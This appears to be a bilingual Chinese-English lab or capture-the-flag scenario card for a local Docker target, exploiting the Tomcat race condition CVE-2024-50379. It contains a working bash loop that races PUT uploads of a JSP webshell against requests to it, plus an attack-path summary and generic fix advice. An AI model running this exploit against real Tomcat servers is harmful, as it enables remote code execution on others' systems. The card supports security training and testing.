# WEB-02: Apache Tomcat Race Condition RCE

## 场景信息

| 字段 | 值 |
|---|---|
| ID | WEB-02 |
| 名称 | Apache Tomcat Race Condition RCE |
| 技术/CVE | CVE-2024-50379 |
| 难度 | L2 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10102 |

## 场景概述
- 技术：CVE-2024-50379
- 难度：L2
- 交付方式：docker
- 入口端口：10102
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2024-50379 |
| Difficulty | L2 |
| Port | 10102 |
| Image | tomcat:9.0.97-jdk11 |

### Attack Path
```
PUT .jsp file → Race condition: JSP compilation before PUT validation → RCE → /opt/flag.txt
```

### Step-by-Step

```bash
# Upload JSP webshell with concurrent requests (race condition exploit)
for i in $(seq 1 100); do
  curl -X PUT "http://localhost:10102/shell.jsp" -d '<% Runtime.getRuntime().exec("cat /opt/flag.txt") %>' &
  curl "http://localhost:10102/shell.jsp" &
done
wait

# Flag: flag{web-02-xxxxxxxxxxxxxxxx}
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Tomcat WebDAV-style PUT endpoint and concurrent HTTP requests |
| 侦察与前置条件 | JSP write protection and compilation timing observation |
| 核心漏洞与利用 | Race a JSP upload against validation to obtain a web shell |
| 权限、横向或影响 | Tomcat process command execution |
| 验证 | Request the compiled JSP and capture its flag output |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
